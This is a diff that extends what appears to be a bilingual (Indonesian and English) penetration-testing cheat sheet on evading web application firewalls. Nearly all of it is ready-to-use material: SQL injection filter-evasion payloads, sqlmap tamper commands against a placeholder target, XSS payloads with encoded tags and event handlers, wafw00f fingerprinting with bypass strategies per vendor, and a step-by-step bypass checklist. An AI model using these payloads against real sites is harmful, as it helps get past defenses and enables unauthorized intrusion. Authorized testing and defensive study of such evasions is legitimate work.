@@ -94,3 +94,151 @@ If CDN WAF (Cloudflare):
 - sqlmap tamper — https://github.com/sqlmapproject/sqlmap/tree/master/tamper
 - PortSwigger Smuggling — https://portswigger.net/web-security/request-smuggling
 - PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings
+
+## 6. SQLi WAF Bypass — Payload Konkret (Testable)
+
+### No Space Allowed
+
+| Payload | Deskripsi |
+|---------|-----------|
+| `?id=1%09and%091=1%09--` | `%09` = tab |
+| `?id=1%0Aand%0A1=1%0A--` | `%0A` = line feed |
+| `?id=1%0Band%0B1=1%0B--` | `%0B` = vertical tab |
+| `?id=1%0Cand%0C1=1%0C--` | `%0C` = form feed |
+| `?id=1%0Dand%0D1=1%0D--` | `%0D` = carriage return |
+| `?id=1%A0and%A01=1%A0--` | `%A0` = non-breaking space |
+
+```sql
+-- Bypass via comment + parenthesis
+?id=1/*comment*/AND/**/1=1/**/--
+?id=1/*!12345UNION*//*!12345SELECT*/1--
+?id=(1)and(1)=(1)--
+```
+
+### Non-Space Whitespace Support per DBMS
+
+| DBMS | Whitespace Hex |
+|------|---------------|
+| SQLite3 | 0A, 0D, 0C, 09, 20 |
+| MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
+| PostgreSQL | 0A, 0D, 0C, 09, 20 |
+| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
+| MSSQL | 01-1F, 20 |
+
+### No Comma Allowed
+
+```sql
+-- Bypass via OFFSET, FROM, JOIN
+LIMIT 0,1              →  LIMIT 1 OFFSET 0
+SUBSTR('SQL',1,1)      →  SUBSTR('SQL' FROM 1 FOR 1)
+SELECT 1,2,3,4         →  UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+```
+
+### No Equal Allowed
+
+```sql
+-- Bypass via LIKE/IN/BETWEEN
+SUBSTRING(VERSION(),1,1)=5          →  SUBSTRING(VERSION(),1,1)LIKE(5)
+SUBSTRING(VERSION(),1,1)NOT IN(4,3)
+SUBSTRING(VERSION(),1,1)IN(4,3)
+SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
+```
+
+### Case Modification
+
+```sql
+UnIoN SeLeCT
+uNiOn sElEcT
+/*!50000UNION*//*!50000SELECT*/
+```
+
+### sqlmap Tamper Script
+
+```bash
+# Tamper = transform payload untuk bypass WAF
+sqlmap -u "http://target/?id=1" --tamper=space2comment
+sqlmap -u "http://target/?id=1" --tamper=between,randomcase,space2comment
+sqlmap -u "http://target/?id=1" --tamper=charunicodeencode
+sqlmap -u "http://target/?id=1" --tamper=apostrophemask
+sqlmap -u "http://target/?id=1" --tamper=charencode
+
+# Tamper list (populer):
+# space2comment     → space → /**/
+# between           → = → BETWEEN
+# randomcase        → case acak
+# charunicodeencode → unicode encode
+# apostrophemask    → ' → %EF%BC%87
+```
+
+## 7. XSS WAF Bypass — Payload Konkret
+
+### Encoding Bypass
+
+```html
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script >alert(1)</script >     <!-- extra space -->
+<script\x20>alert(1)</script>  <!-- tab -->
+<script\x00>alert(1)</script>  <!-- null byte -->
+<script\t>alert(1)</script>
+```
+
+### Tag Variation
+
+```html
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+```
+
+### Event Handler Bypass
+
+```html
+<!-- WAF filter "onerror" -->
+<img src=x oNeRrOr=alert(1)>
+<img src=x on\terror=alert(1)>   <!-- tab -->
+<img src=x on\nerror=alert(1)>   <!-- newline -->
+<img src=x o\x00nerror=alert(1)> <!-- null -->
+```
+
+### JavaScript Execution
+
+```html
+<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- base64 -->
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror="&#97;lert(1)">  <!-- html entity -->
+```
+
+## 8. wafw00f — Fingerprint Target
+
+```bash
+# Identify WAF
+python3 wafw00f https://target.com
+
+# Output: "The site https://target.com is behind Cloudflare"
+# Lalu pilih bypass strategi sesuai vendor:
+#   Cloudflare → protocol-level, encoding, chunked
+#   Akamai → slow rate, header manipulation
+#   ModSecurity → rule bypass, CRS gap
+#   AWS WAF → regex bypass, size limit
+```
+
+## 9. Test Checklist WAF Bypass
+
+1. `wafw00f` identifikasi vendor WAF
+2. Baseline: kirim payload mentah → block?
+3. Encoding: URL encode, double encode, hex, unicode
+4. Case: `union` → `UnIoN`, `UnIoN`, `/**/`
+5. Whitespace: comment → `/**/`, tab → `%09`, newline → `%0a`
+6. Protocol: HTTP desync, chunked, pipeline
+7. Tamper: `sqlmap --tamper=space2comment,between`
+8. Verify: response beda (data muncul / error / timing)
+---
+
+audited
+---
